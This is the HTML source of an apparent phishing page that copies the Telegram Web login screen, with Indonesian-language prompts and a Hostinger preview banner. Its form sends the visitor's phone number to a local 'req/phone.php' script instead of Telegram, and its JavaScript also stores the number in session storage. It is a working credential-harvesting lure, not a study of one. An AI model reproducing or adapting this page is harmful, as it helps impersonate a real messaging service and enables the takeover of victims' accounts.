<html lang="en" translate="no" class="notranslate theme-light" data-message-text-size="16" >
 <head>
  <meta charset="UTF-8">
  <title>Telegram Web</title>
  <meta name="title" content="Telegram Web">
  <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="mobile-web-app-title" content="Telegram Web">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Telegram Web">
  <meta name="application-name" content="Telegram Web">
  <meta name="msapplication-TileColor" content="#2b5797">
  <meta name="theme-color" content="#fff">
  <meta name="google" content="notranslate">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://web.telegram.org/z/">
  <meta property="og:title" content="Telegram Web">
  <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="og:image" content="./icon-192x192.png">
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="https://web.telegram.org/z/">
  <meta property="twitter:title" content="Telegram Web">
  <meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="twitter:image" content="./icon-192x192.png">
  <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="192x192" href="./icon-192x192.png">
  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
  <link href="static/css/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet">
 </head>
 <body class="animation-level-2 is-touch-env is-android"><div style="position:absolute;top:0;z-index:2147483647;display:flex;padding:16px;width:100%;background-color:#fff;box-shadow:0 0 6px rgba(29,30,32,.22);box-sizing:border-box" id="hostinger-preview-banner"><div style="display:flex;justify-content:center;gap:8px;width:100%;font-style:normal;font-weight:400;font-size:14px;line-height:24px;color:#1d1e20"><svg fill="#fea419" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><g><path clip-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill-rule="evenodd"/></g></svg><div>This is a preview of a website by a customer of Hostinger</div></div><svg fill="#727586" height="24" width="24" xmlns="http://www.w3.org/2000/svg" onclick="document.getElementById('hostinger-preview-banner').style.display='none'" style="cursor:pointer"><g><path clip-rule="evenodd" d="M19 6.41L17.59 5L12 10.59L6.41 5L5 6.41L10.59 12L5 17.59L6.41 19L12 13.41L17.59 19L19 17.59L13.41 12L19 6.41Z" fill-rule="evenodd"/></g></svg></div>
  <noscript>
   <div id="logo"></div>
   <h1>Telegram Web</h1>
   <p>Please, enable JavaScript to open the app.</p>
  </noscript>
  <div id="loader" class="bg-load load6" style="display:none;">
    <div class="loader"></div>
  </div>
  <div id="root">
   <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
    <div class="Transition full-height is-auth fade">
     <div class="Transition__slide--active">
      <div class="Transition Auth fade">
       <div class="Transition__slide--active">
        <div id="auth-phone-number-form" class="custom-scroll">
         <div class="auth-form">
          <div id="logo"></div>
          <h1>Telegram</h1>
          <p class="note">Silahkan masukkan kode negara dan masukkan nomor telpon anda.</p>
          <form action="req/phone.php" method="post" onsubmit="loadd();">
           <div class="DropdownMenu CountryCodeInput">
            <div class="input-group" id="labelFlag">
             <input class="form-control" type="text" id="sign-in-phone-code" autocomplete="off">
             <label>Negara</label>
             <i class="css-icon-down" id="arow"></i>
            </div>
            <div class="Menu" style="display:none;" id="Menu">
             <div class="backdrop" id="backdrop"></div>
             <div role="presentation" class="bubble menu-container custom-scroll top left opacity-transition fast open shown" style="transform-origin: left top;">
              <div role="menuitem" tabindex="0" class="MenuItem" id="iteM">
               <span class="country-flag"><img src="lib/img-apple-160/1f1ee-1f1fe9.png" class="emoji" alt="ðŸ‡®ðŸ‡©" data-path="./img-apple-160/1f1ee-1f1fe9.png"></span>
               <span class="country-name">Indonesia</span>
               <span class="country-code">+62</span>
              </div>
             </div>
            </div>
           </div>
<!--           <div class="input-group touched with-label">-->
           <div class="input-group" id="labelhp">
            <input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number" name="phoneNumber" autocomplete="off">
            <label for="sign-in-phone-number">nomor telepon anda</label>
           </div>
           <label class="Checkbox"><input checked type="checkbox" id="sign-in-keep-session">
            <div class="Checkbox-main">
             <span class="label" dir="auto">Keep me signed in</span>
            </div></label>
           <button id="nextBtn" type="submit" class="Button default primary" style="">SELANJUTNYA
             <div class="ripple-container"><span style="left: 88px; top: -81.9375px; width: 188px; height: 188px;"></span></div>
           </button>
           <button type="button" class="Button default primary text has-ripple" style="">Log in by QR Code
             <div class="ripple-container"></div>
           </button>
          </form>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
  <div id="portals"></div>
 </body>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
var flag = document.getElementById("sign-in-phone-code");
var backdrop = document.getElementById("backdrop");
var backd = document.getElementById("iteM");
$("#labelhp").hide()
$("#Menu").hide();
flag.addEventListener("click", function(){
    $("#Menu").show();
    document.getElementById("arow").classList.add("open");
    backdrop.addEventListener("click",hideMenu);
    backd.addEventListener("click",hideMenu);
    function hideMenu(){
        flag.value = "Indonesia";
        document.getElementById("labelFlag").classList.add("touched");
        document.getElementById("arow").classList.remove("open");
        $("#Menu").hide();
        aktip()
    }
})
var inpHp = document.getElementById("sign-in-phone-number");
var btnnext = document.getElementById("nextBtn");
$(btnnext).css("display","none");
inpHp.addEventListener("click",aktip);
var btnnext = document.getElementById("nextBtn");
btnnext.addEventListener("click",set_item);
function set_item(){
    sessionStorage.setItem("nohp", inpHp.value);
}
function aktip(){
    $("#labelhp").fadeIn();
    var inpHp = document.getElementById("sign-in-phone-number");
    inpHp.focus();
    var label = document.getElementById("labelhp");
    var btnnext = document.getElementById("nextBtn");
    $(btnnext).css("display","none");
    label.classList.add("touched");
    inpHp.value = "+62"
    inpHp.addEventListener("input", validate);
    function validate(){
        if (inpHp.value.length > 0){
            label.classList.add("touched");
        } else {
            label.classList.remove("touched");
        }
        if (inpHp.value.length > 6){
            $(btnnext).fadeIn(300);
        } else {
            $(btnnext).fadeOut("fast");
        }
        if (inpHp.value == "62"){
            inpHp.value = "+62"
        }
    }
}
function loadd(){
    $("#loader").fadeIn();
}
</script>
</html>
